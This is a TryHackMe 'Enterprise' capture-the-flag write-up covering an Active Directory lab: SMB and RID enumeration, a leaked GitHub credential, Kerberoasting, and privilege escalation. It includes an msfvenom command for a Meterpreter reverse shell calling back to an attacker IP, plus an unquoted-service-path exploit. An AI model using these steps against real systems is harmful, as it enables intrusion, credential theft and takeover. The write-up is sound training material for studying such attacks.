---
title: Enterprise — Tryhackme Writeup
date: 2022-01-01 12:00:00 -500
categories: [CTF writeups,tryhackme]
tags: [activedirectory]
---

You just landed in an internal network. You scan the network and there’s only the Domain Controller

![](https://cdn-images-1.medium.com/max/3840/1*B-YgfwR0Zllf3sR8CmNtVA.png)

## ✅ Information Gathering

### Rustscan

First, it is good to find open ports with rustscan !! you know why !! it scans all ports ranging from 0–65535 in less than 10 secs!!

![](https://cdn-images-1.medium.com/max/2076/1*w8_8L61J_zLTWrEIN5LfGQ.png)

we can see we have a couple of ports open, including 88 which is for Kerberos authentication things. so, most likely it is the domain controller.

Now let's try to run NMAP, to get more details, like the domain name from LDAP and the service version !!

![](https://cdn-images-1.medium.com/max/2610/1*L--il6V8xmIo-0owPYaxow.png)

As you can see we got the domain name from the RDP port (3389) i.e LAB.ENTERPRISE.THM

now first let's add this domain name to our /etc/hosts

![](https://cdn-images-1.medium.com/max/2000/1*RJQrJWW1a9teN2N3udkssw.png)

## ✅ SMB Port Enumeration (445)

First, I like to enumerate SMB port. Let's first try to list the shares, with NULL Session.

![](https://cdn-images-1.medium.com/max/3414/1*yPRguvUKAIJvMHy4_aVIwQ.png)

as you can see we have READ ****permission on IPC$ so, we can use impacket-lookupsid to find the possible usernames. But for now, let's keep enumerating.

since we have read access on **Users** and **Docs**, let's dump those locally on my machine. to enumerate more efficiently.

so, for dumping shares, I can either use CIFS (common internet file system) OR crackmapexec to spider the shares like so :

![](https://cdn-images-1.medium.com/max/3854/1*1nfuB9VNsfrACBW_f9932A.png)

It will going to store the result in /tmp/cme_spider_plus :

![](https://cdn-images-1.medium.com/max/2000/1*7ievxE95PzP0YOnT60OaSQ.png)

let now run the tree command , we can visually see the files that standout :

![](https://cdn-images-1.medium.com/max/2000/1*NYBa4ruxm8qHho40zaUQWQ.png)

![](https://cdn-images-1.medium.com/max/2540/1*uOhrup3PBUVHDhFXb07t_A.png)

so, there are three files that stand out two of them are the document file, which seems to be encrypted (we will come back here if comes to a dead end), and one Consolehost_history.txt file. which is the default file that logs the PowerShell command history. let's see the content of it !!

![](https://cdn-images-1.medium.com/max/3348/1*qwlOZEk9vpTUp2dFT7_O0A.png)

we can see a username and password, lets's try to use those credential.

![](https://cdn-images-1.medium.com/max/3874/1*A1gDHbRSW12ZRNCB6hvUJA.png)

but we can see we got a logon failure !! I tried with a different protocol also, and we got a logon failure.

Now I thought of password spraying, but first, we need to get all usernames.

## ✅ Username Enumeration in AD

since we have read access on IPC$, we can enumerate users either by using crackmapexec , or impacket-lookupsid.py . for now, I will be using impacket-lookupsid.py

here we actually enumerate by brute-forcing RID (relative identifier)

![](https://cdn-images-1.medium.com/max/2000/1*DiZ_PeR2ZS6K4bJ3dPZawQ.png)

here we will get all users, let's create a usernames.txt file by properly formatting it. impacket-lookupsid 'anonymous:'@<ip> | cut -d " " -f 2 > usernames.txt

also, remove the unnecessary account !!

so we have a usernames list. now let's try to spray it against the password we found in the Consolehistory file.

![](https://cdn-images-1.medium.com/max/3876/1*hTf8DM0orwTJFJKWUw0PNg.png)

as you can see we got STATUS_LOGON_FAILURE things.

## ✅ Enumerating port 80

![](https://cdn-images-1.medium.com/max/2000/1*TeGUGFyjPQvWJcdykvnh2g.png)

here I tried to brute force the directory, but nothing comes up accept robots.txt, this is worth checking !!

![](https://cdn-images-1.medium.com/max/2000/1*7uovLcV6BbvZhQvSGLDVaw.png)

but we didn't get anything !!

it was more likely a dead end, so, I started to crack those document files, and start the enumeration process again. but again nothing comes up

After waiting for a while, I found that there was a port that was shown in our RUSTSCAN result but not in our Nmap result which is **7990.**

so I fire up Nmap against it !!

![](https://cdn-images-1.medium.com/max/2778/1*2nWV-gYMqlKuWr4NJ5hS9Q.png)

it was running a MICROSOFT IIS server. let's enumerate that !!

![](https://cdn-images-1.medium.com/max/2000/1*etfPh4BUMRstGrsLzbTetQ.png)

first, I tried to enter the cred I got as an email replication@lab.enterprise.thm

I tried web directory bruteforcing and some other enumeration but nothing is really coming up.

But on the top of the login page, it's written that we are moving to GitHub.

so let's search for GitHub for LABS.Enterprise.thm.

![](https://cdn-images-1.medium.com/max/2222/1*0k87Gz_JtwPVm3dqUFUFRw.png)

here there was nothing except an about-us file, but we have found a user

![](https://cdn-images-1.medium.com/max/2000/1*tJyUHEQqXBSBvFaLvJI6KA.png)

his name is Nik-enterprise-dev, if we go on his profile, we get some management script, but nothing useful. but if we see the commit done, we found something really interesting.

![](https://cdn-images-1.medium.com/max/2000/1*Vu105rUx6eyGLygopvwocA.png)

so finally we got the first credential, **nik: ToastyBoi! . **we can now verify the credential :

![](https://cdn-images-1.medium.com/max/3850/1*oh2iLvm-5aDEb9SyzWy3vw.png)

and indeed they are valid credentials!!

Let's now search for any kerberostable user there, and dump their hash with impacket.

## ✅ Finding Kerberostable Users

![](https://cdn-images-1.medium.com/max/3870/1*NMAWGDYF6m1uQqI6_NfbtA.png)

ok, so we got a user account with Kerberos authentication enabled; so we were able to dump their hash.

let's try to crack them with hashcat :

![](https://cdn-images-1.medium.com/max/3842/1*IkC_7XEOFTQv8hMUbsgS_A.png)

## ✅ Initial Foothold

after getting two valid credentials; I started the enumeration process again, but this time I thought, let’s first get access. I tried to use evil-winrm but it was not working, as Psremoting was not configured for these accounts. But from our NMAP result, we remember that RDP was running. I tried to get access with RDP on both user creds, and one user creds (bitbucket) was having RDP access.

on logging in we get user.txt the file.

![](https://cdn-images-1.medium.com/max/2000/1*9Q-tuQps0Gwkt6otvs3esA.png)

Now since we are on DC (domain controller) only. we need to elevate our privileges.

## ✅ Privilege Escalation

so first, let's get meterpreter reverse shell so that we could easily work on post-exploitation and privilege escalation.

simply transfer the exploit with the payload configured as windows/x64/meterpreter/reverse_tcp after gaining the first access, I tried to run the **local exploit suggester** to find any exploit that can be used !!

![](https://cdn-images-1.medium.com/max/3870/1*_v4A-F73rCbKHcTd7u_mgA.png)

yes, we got some suggestions, after trying them, I only got an error exploit completed but no session created which is sad !!

![](https://cdn-images-1.medium.com/max/2000/1*l7RQMcaErVMrYQ26CcZcXA.gif)

now I thought of transferring **winpeas.exe **to find a more privileged escalation vector.

![](https://cdn-images-1.medium.com/max/3856/1*emIcFmUxh0E47O53hJuqQw.png)

and yes, there is one **unquoted service path injection vulnerability**, we can take advantage of that.

so I created a msfvenom exploit like so :

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.17.0.110 LPORT=4443 -f exe -o ZeroTier.exe

and transfer it to the path c:\Program Files (x86)\Zero Tier\Zero Tier One

with name as ZeroTier.exe , which will allow us to take advantage of the unquoted service name path.

now let's start the service with Powershell

    Start-Service zerotieroneservice

![](https://cdn-images-1.medium.com/max/NaN/1*XXv66kHqw_dhBOg9Cptj1g.png)

we got the shell, but after getting the shell 4–5 times it is dying every time, so; I think we need to migrate it to a stable process. we can use a post-exploitation module of Metasploit with is windows/manage/migrate . by using that we can migrate to a more stable process.

![](https://cdn-images-1.medium.com/max/2022/1*Y0oG6iRbrLSbSvcwOElF-Q.png)

now we got a stable shell as administrator

![](https://cdn-images-1.medium.com/max/2000/1*7LMp4IDKMWUv8pnpkfzLXw.png)

and yes, finally we got the root.txt file !!

![](https://cdn-images-1.medium.com/max/2000/1*SEpl9H5MuKWZrXHsuxLymQ.gif)

THANK YOU FOR READING MY ARTICLE !! 👊👊

please support me by following me on medium and other social platforms:

[https://surya-dev.medium.com/](https://surya-dev.medium.com/)

[https://twitter.com/kryolite_secure](https://twitter.com/kryolite_secure)/

https://[www.instagram.com/kryolite_security/](https://www.instagram.com/kryolite_security/)

[https://github.com/surya-dev-singh/](https://github.com/surya-dev-singh/)

you guys can subscribe to me 🙌on YouTube: **I post walkthroughs and other ethical hacking-related videos there.**
[**Kryolite Security**
*Hello World! On Kryolite Security you will find videos on ethical hacking , cyber security , penetration testing , CTFs…*www.youtube.com](https://www.youtube.com/channel/UCNKXlqfPevPg2Cv1R5YZ6Jw)
[**Dark Web Introduction**
*This will be the first blog of the Dark Web Documentary Series*systemweakness.com](https://systemweakness.com/dark-web-introduction-8d965a8e68e2)
[**BITB (browser in the browser)Attack**
*make phishing nearly undetectable using BITB attack !!*infosecwriteups.com](https://infosecwriteups.com/bitb-browser-in-the-browser-attack-e2008c405701)
[**Attacktive Directory — Exploitation of Vulnerable Domain controller [TryHackMe]**
*99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?*systemweakness.com](https://systemweakness.com/attacktive-directory-tryhackme-90465c2d48ea)
[**HackTheBox Canvas CTF Writeup**
*DESCRIPTIONS :*infosecwriteups.com](https://infosecwriteups.com/hackthebox-canvas-ctf-writeup-75b0f4682ef5)

### From Infosec Writeups: A lot is coming up in the Infosec every day that it’s hard to keep up with. [Join our weekly newsletter](https://weekly.infosecwriteups.com/) to get all the latest Infosec trends in the form of 5 articles, 4 Threads, 3 videos, 2 GitHub Repos and tools, and 1 job alert for FREE!
